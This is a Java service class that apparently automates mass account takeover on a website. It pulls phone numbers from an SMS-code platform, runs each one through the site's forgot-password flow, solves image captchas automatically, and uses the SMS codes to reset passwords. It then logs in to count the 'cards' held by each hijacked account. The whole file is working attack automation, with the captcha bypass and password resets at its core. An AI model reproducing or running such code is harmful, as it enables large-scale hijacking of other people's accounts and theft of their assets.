package com.tip.enzo.service;

import com.tip.enzo.common.ImageVerifyCodeResult;
import com.tip.enzo.helper.RecognizeImageHelper;
import com.tip.enzo.model.LoginResultModel;
import com.tip.enzo.model.UserInfoModel;
import org.apache.commons.lang3.StringUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;
import org.springframework.util.CollectionUtils;

import java.io.InputStream;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Created by enzo on 17/1/4.
 * <p>
 * 用于天码网站的service
 */
@Service
public class ScannerService implements Runnable {


    private static final Logger logger_deal = LoggerFactory.getLogger("deal");

    private static final Logger logger_success = LoggerFactory.getLogger("success");

    private static final int MAX_IMAGE_DECODE_TRY_TIME = 15;

    private static final int imageSplitPieces = 4;

    private XianlaiService xianlaiService;

    private TianMaService tianMaService;


    @Override
    public void run() {
        doScan(tianMaService, xianlaiService);
    }


    private synchronized void doScan(TianMaService tianMaService, XianlaiService xianlaiService) {
        while (true) {
            try {

                // TODO: 17/1/25 多线程、不保存验证码图片、抓取卡的数量和地区、打成jar包


                /*
                 * step.1---获取可用号码
                 */
                List<String> phoneNumbers;
                try {
                    phoneNumbers = tianMaService.getPhoneNumber();
                } catch (Exception e) {
                    e.printStackTrace();
                    Thread.sleep(10000);
                    continue;
                }

                if (CollectionUtils.isEmpty(phoneNumbers)) {
                    continue;
                }




                /*
                 * step2.--- 开始处理
                 */
                process(tianMaService, xianlaiService, phoneNumbers);




                /*
                 * step3.--- 释放号码
                 */
                tianMaService.releasePhoneNumbers();

            } catch (Exception e) {
                e.printStackTrace();
                System.exit(0);
            }


        }
    }


    private void process(TianMaService tianMaService, XianlaiService xianlaiService, List<String> phoneNumbers) throws Exception {
        for (String phoneNumber : phoneNumbers) {
            logger_deal.info("开始处理号码：" + phoneNumber);

            String cookie = xianlaiService.getForgetPasswordDocument();

            /*
             * 1.获取验证码图片
             * 2.解析图片验证码
             */
            String imgVerifyCode = "";
            int retryTime = 0;
            ImageVerifyCodeResult imageVerifyCodeResult = ImageVerifyCodeResult.NETWORK_ERROR;
            while (StringUtils.isBlank(imgVerifyCode)) {
                retryTime++;
                InputStream inputStream = xianlaiService.fetchVerifyCodeImages(cookie);
                imgVerifyCode = RecognizeImageHelper.recognize(inputStream);
                if (StringUtils.isBlank(imgVerifyCode) || imgVerifyCode.length() != imageSplitPieces) {
                    continue;
                }
                if (retryTime > MAX_IMAGE_DECODE_TRY_TIME) {
                    break;
                }
                imageVerifyCodeResult =
                        xianlaiService.verifyImageCodeAndSendMsg(phoneNumber, imgVerifyCode, cookie);

                if (imageVerifyCodeResult.equals(ImageVerifyCodeResult.VERIFY_CODE_FAIL)) {
                    imgVerifyCode = "";
                    continue;
                }
                if (imageVerifyCodeResult.equals(ImageVerifyCodeResult.PHONE_NOT_EXIST)) {
                    break;
                }
                if (imageVerifyCodeResult.equals(ImageVerifyCodeResult.SUCCESS)) {
                    break;
                }


            }


            if (!imageVerifyCodeResult.equals(ImageVerifyCodeResult.SUCCESS)) {
                continue;
            }

            String smsCode = tianMaService.getSmsContent(phoneNumber);

            if (StringUtils.isNotBlank(smsCode)) {
                if (xianlaiService.toNext(phoneNumber, imgVerifyCode, smsCode, cookie)) {


                    //login & fetch userInfo
                    Integer cardNum = null;

                    try {
                        ConcurrentHashMap<String, String> params = getLoginParams(xianlaiService);
                        LoginResultModel resultModel = getLoginResult(xianlaiService, phoneNumber, params);

                        if (resultModel != null) {
                            if (!resultModel.getResult().contains("Err")) {
                                //登录成功
                                if (resultModel.getResult().equals("py")) {

                                    UserInfoModel userInfo = xianlaiService.getUserInfo(params.get("cookie"));
                                    cardNum = userInfo.getCardNum();
                                }
                            }
                        }
                    } catch (Exception e) {
                        // TODO: 17/2/5 response 乱码

                    }


                    if (cardNum == null) {
                        System.out.println("修改密码成功，号码：" + phoneNumber);
                        logger_success.info("修改密码成功：" + phoneNumber);

                    } else {
                        System.out.println("修改密码成功，号码：" + phoneNumber + "卡的数量：" + cardNum);
                        logger_success.info("修改密码成功：" + phoneNumber + "卡的数量" + cardNum);
                    }


                    //加入黑名单
                    tianMaService.addOnBlackList(phoneNumber);
                }
            }

        }
    }

    private ConcurrentHashMap<String, String> getLoginParams(XianlaiService xianlaiService) {
        try {
            return xianlaiService.getUserLoginPage();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;

    }


    private LoginResultModel getLoginResult(XianlaiService xianlaiService, String phone, Map<String, String> params) {
        if (params == null) {
            return null;
        }
        try {
            String cookie = params.get("cookie");
            //// TODO: 17/1/28 验证码
            String verifyCode = params.get("fileName");

            return xianlaiService.login(cookie, phone, verifyCode);

        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }


    public XianlaiService getXianlaiService() {
        return xianlaiService;
    }

    public void setXianlaiService(XianlaiService xianlaiService) {
        this.xianlaiService = xianlaiService;
    }

    public TianMaService getTianMaService() {
        return tianMaService;
    }

    public void setTianMaService(TianMaService tianMaService) {
        this.tianMaService = tianMaService;
    }


    public ScannerService() {
    }

    public ScannerService(XianlaiService xianlaiService, TianMaService tianMaService) {
        this.xianlaiService = xianlaiService;
        this.tianMaService = tianMaService;
    }

}
